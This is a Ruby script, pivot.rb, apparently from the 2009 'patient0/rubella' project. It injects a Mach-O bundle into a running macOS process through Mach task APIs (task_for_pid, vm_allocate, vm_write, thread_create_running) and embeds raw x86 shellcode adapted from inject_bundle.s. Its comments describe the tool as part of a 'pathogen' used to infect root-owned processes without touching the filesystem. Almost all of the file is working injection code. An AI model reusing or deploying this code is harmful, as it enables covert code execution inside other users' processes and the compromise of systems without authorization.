# pivot.rb - injects a mach-o bundle from stdin into the pid on the cmdline
# Copyright (c) 2009 Will Drewry <redpig@dataspill.org>. All rights reserved.
# Use of this source code is governed by a BSD-style license that can be
# found in the LICENSE file or at http://github.org/redpig/patient0.
#
# Usage:
# cat payload.rb pivot.rb | ruby - <pid>
#
# Wrapper for libSystemB.dylib's process interaction functions: vm_write,
# vm_allocate, task_for_pid, and thread_create_running It may one day become a
# full featured wrapper around these functions but for now, it is meant to be a
# script packaged with the rubella patient0 pathogen.  It is used to infect a
# root-owned process with a selected payload by bouncing through
# AuthorizationExecuteWithPrivileges without touching the filesystem.  (No, not
# for forensic reasons, but because it's more challenging that way!)

require 'dl'
require 'dl/import'
require 'dl/struct'

module SystemB
  extend DL::Importable
  class SystemError < RuntimeError; end
  #dlload "/usr/lib/libSystem.B.dylib"
  LIB = DL.dlopen("/usr/lib/libSystem.B.dylib")
  SYM = {}

  # Extra type definitions
  typealias("mach_port_t", "int")
  IntRef = struct(["int value"]) # int * cases
  # From from mach/i386/_struct.h
  #           mach/i386/thread_status.h
  I386_THREAD_STATE = 1
  X86ThreadStateStruct = struct([
    "uint eax",
    "uint ebx",
    "uint ecx",
    "uint edx",
    "uint edi",
    "uint esi",
    "uint ebp",
    "uint esp",
    "uint ss",
    "uint eflags",
    "uint eip",
    "uint cs",
    "uint ds",
    "uint es",
    "uint fs",
    "uint gs"
  ])

  class X86ThreadState < Hash
    def initialize
      [:eax, :ebx, :ecx, :edx, :edi, :esi,
       :ebp, :esp, :ss, :eflags, :eip,
       :cs, :ds, :es, :fs, :gs].each do |k|
        self[k] = 0
      end
    end

    def to_struct
      state = X86ThreadStateStruct.malloc
      self.each_pair do |key, value|
        state.send("#{key}=", value)
      end
      return state
    end
  end

  # Helpers

  # Creates a ruby-managed integer reference
  # so that we don't have to malloc and free ourselves.
  def SystemB::make_int_by_ref()
    i = [0].pack('I').to_ptr
    i.struct!('I', :value)
    return i
  end
  def SystemB::get_int_from_ref(i)
    return i[:value]
  end


  # natural_t == int, usually on x86
  SYM[:mach_task_self] = LIB['mach_task_self', 'I']
  def SystemB::mach_task_self
    return SYM[:mach_task_self].call()[0]
  end

  class TaskForPidError < SystemError; end
  SYM[:task_for_pid] = LIB['task_for_pid', 'IIIP']
  def SystemB::task_for_pid(pid)
    task_self = mach_task_self()
    task_ptr = make_int_by_ref
    result = SYM[:task_for_pid].call(task_self, pid, task_ptr)
    # TODO: raise appropriate exceptions per error code/errno
    raise TaskForPidError, "returned #{result[0]}" if result[0] != 0
    return get_int_from_ref(task_ptr)
  end

  class VmAllocateError < SystemError; end
  SYM[:vm_allocate] = LIB['vm_allocate', 'IIPII']
  def SystemB::vm_allocate(task, size, anywhere=true)
    address_ptr = make_int_by_ref
    anywhere_i = 0
    anywhere_i = 1 if anywhere
    result = SYM[:vm_allocate].call(task, address_ptr, size, anywhere_i)
    # TODO: raise appropriate exceptions per error code/errno
    raise VmAllocateError, "returned #{result[0]}" if result[0] != 0
    return get_int_from_ref(address_ptr)
  end

  class VmWriteError < SystemError; end
  SYM[:vm_write] = LIB['vm_write', 'IIIPI']
  def SystemB::vm_write(task, address, data)
    result = SYM[:vm_write].call(task, address, data, data.length)
    # TODO: raise appropriate exceptions per error code/errno
    raise VmWriteError, "returned #{result[0]}" if result[0] != 0
    return true
  end


  class ThreadCreateRunningError < SystemError; end
  SYM[:thread_create_running] = LIB['thread_create_running', 'IIIPIP']
  def SystemB::thread_create_running(task, x86_state)
    thread_handle = make_int_by_ref
    state_struct = x86_state.to_struct
    state_count = state_struct.size / DL.sizeof('I')
    #state_struct = ([0xdeadbeef]*16).pack('L*').to_ptr
    result = SYM[:thread_create_running].call(task,
                                              I386_THREAD_STATE,
                                              state_struct,
                                              state_count,
                                              thread_handle)
    # TODO: raise appropriate exceptions per error code/errno
    raise ThreadCreateRunningError, "returned #{result[0]}" if result[0] != 0
    return get_int_from_ref(thread_handle)
  end

  # TODO! Implement all of patient0 in ruby and have a bundle to inject
  # which loads ruby and receives the payload over the open fd.
  # We may even be able to do jump patching uѕing
  #   DL.callback('IPP'){|ptr1, ptr2| ... }
  # MMmmmm
end

class MachTask
  class MachTaskError < RuntimeError; end
  attr_accessor :handle
  def initialize(bsd_pid)
    @handle = SystemB::task_for_pid(bsd_pid)
  end

  def inject(bundle)
  end

  def create_running_thread(code, state=SystemB::X86ThreadState.new)
    # Allocate the stack segment
    stack_size = 64 * 1024
    stack_addr = SystemB.vm_allocate(@handle, stack_size)
    # Prep our processor state as we go
    state[:esp] = stack_addr + (stack_size / 2)
    # Let's just give it a bit of space
    state[:ebp] = state[:esp] - 12
    # Allocate the code segment
    code_addr = SystemB.vm_allocate(@handle, code.length)
    state[:eip] = code_addr

    # Populate the segments
    SystemB.vm_write(@handle, code_addr, code)
    SystemB.vm_write(@handle, stack_addr, "\x00"*stack_size)

    # Fire it up and return the handle
    # TODO add thread tracking, task_info, etc
    return SystemB::thread_create_running(@handle, state)
  end

  def to_i
    return handle
  end
end

# This is a modified version of Dino Dai Zovi's <ddz@theta44.org>
# inject_bundle.s.
# @args: edi -> bundle_address, esi -> bundle_length
INJECT_BUNDLE = [
  0xe9, 0x3d, 0x01, 0x00, 0x00, 0x8b, 0x44, 0x24, 0x04, 0x50, 0x68, 0x00,
  0x00, 0xe0, 0x8f, 0xe8, 0x03, 0x00, 0x00, 0x00, 0xc2, 0x04, 0x00, 0x55,
  0x89, 0xe5, 0x83, 0xec, 0x0c, 0x53, 0x56, 0x57, 0x8b, 0x5d, 0x08, 0x8b,
  0x43, 0x10, 0x89, 0x45, 0xfc, 0x80, 0xc3, 0x1c, 0x31, 0xc0, 0x39, 0x45,
  0xfc, 0x0f, 0x84, 0x88, 0x00, 0x00, 0x00, 0x40, 0x39, 0x03, 0x74, 0x10,
  0x40, 0x39, 0x03, 0x74, 0x41, 0xff, 0x4d, 0xfc, 0x03, 0x5b, 0x04, 0xe9,
  0xe0, 0xff, 0xff, 0xff, 0x81, 0x7b, 0x0a, 0x54, 0x45, 0x58, 0x54, 0x74,
  0x0e, 0x81, 0x7b, 0x0a, 0x4c, 0x49, 0x4e, 0x4b, 0x74, 0x10, 0xe9, 0xde,
  0xff, 0xff, 0xff, 0x8b, 0x43, 0x18, 0x89, 0x45, 0xf8, 0xe9, 0xd3, 0xff,
  0xff, 0xff, 0x8b, 0x43, 0x18, 0x2b, 0x45, 0xf8, 0x03, 0x45, 0x08, 0x2b,
  0x43, 0x20, 0x89, 0x45, 0xf4, 0xe9, 0xbf, 0xff, 0xff, 0xff, 0x8b, 0x4b,
  0x0c, 0x31, 0xc0, 0x39, 0xc1, 0x74, 0x34, 0x49, 0x6b, 0xd1, 0x0c, 0x03,
  0x53, 0x08, 0x03, 0x55, 0xf4, 0x8b, 0x32, 0x03, 0x73, 0x10, 0x03, 0x75,
  0xf4, 0x31, 0xff, 0xfc, 0x31, 0xc0, 0xac, 0x38, 0xe0, 0x74, 0x0a, 0xc1,
  0xcf, 0x0d, 0x01, 0xc7, 0xe9, 0xef, 0xff, 0xff, 0xff, 0x3b, 0x7d, 0x0c,
  0x75, 0xcf, 0x8b, 0x42, 0x08, 0x2b, 0x45, 0xf8, 0x03, 0x45, 0x08, 0x5f,
  0x5e, 0x5b, 0xc9, 0xc2, 0x08, 0x00, 0x55, 0x89, 0xe5, 0x83, 0xec, 0x0c,
  0x83, 0xec, 0x10, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0x6a, 0x00, 0x8d,
  0x45, 0xf8, 0x50, 0x56, 0x57, 0x68, 0x81, 0x2a, 0x6b, 0x74, 0xe8, 0x1e,
  0xff, 0xff, 0xff, 0xff, 0xd0, 0x3c, 0x01, 0x75, 0x4d, 0x31, 0xc0, 0x50,
  0xb0, 0x05, 0x50, 0x54, 0xff, 0x75, 0xf8, 0x68, 0x91, 0x81, 0xb1, 0x76,
  0xe8, 0x04, 0xff, 0xff, 0xff, 0xff, 0xd0, 0x89, 0xc3, 0x31, 0xc0, 0x50,
  0x68, 0x5f, 0x72, 0x75, 0x6e, 0x89, 0xe0, 0x50, 0x53, 0x68, 0x9d, 0xf3,
  0xd0, 0x4f, 0xe8, 0xea, 0xfe, 0xff, 0xff, 0xff, 0xd0, 0x81, 0xec, 0x0c,
  0x00, 0x00, 0x00, 0x50, 0x68, 0x52, 0x58, 0x4e, 0xa5, 0xe8, 0xd7, 0xfe,
  0xff, 0xff, 0xff, 0xd0, 0x81, 0xec, 0x08, 0x00, 0x00, 0x00, 0x56, 0x57,
  0xff, 0xd0, 0x31, 0xc0, 0x50, 0x50, 0xb0, 0x01, 0xcd, 0x80, 0x83, 0xec,
  0x10, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0x68, 0x7f, 0x12, 0x28, 0xbf,
  0xe8, 0xb0, 0xfe, 0xff, 0xff, 0x89, 0xe3, 0x81, 0xeb, 0x20, 0x00, 0x00,
  0x00, 0x53, 0xff, 0xd0, 0xe9, 0x61, 0xff, 0xff, 0xff
].pack('c*')

# Read a Mach-o bundle from stdin and inject it in process id ARGV[0]
def main(pid)
  # Inject bundle payload P if supplied.
  # Otherwise read from stdin.
  begin
    bundle = P  # P should be supplied by the caller.
  rescue NameError => e
    $stderr << "[*] reading bundle from $stdin"
  end
  bundle = $stdin.read if bundle.nil?
  # Make sure P didn't gain a newline in the process
  bundle = bundle[1..-1] if bundle[0] == "\n"
  # Add the arguments and their length
  #bundle += ARGV.join(" ")
  #bundle += [ARGV.join(" ").length].pack('V')
  #bundle += [0].pack('c')

  # Get the task handle
  task = MachTask.new(pid)
  # Allocate the bundle in the target process and place it there
  bundle_segment = SystemB::vm_allocate(task.handle, bundle.length)
  SystemB::vm_write(task.handle, bundle_segment, bundle)
  # Prep the registers
  state = SystemB::X86ThreadState.new
  state[:edi] = bundle_segment
  state[:esi] = bundle.length
  thread = task.create_running_thread(INJECT_BUNDLE, state)
end

# TODO: make the args a value to be appended to the bundle
if __FILE__ == $0
  pid = 1
  pid = ARGV[0].to_i if ARGV.length > 0
  main(pid)
end
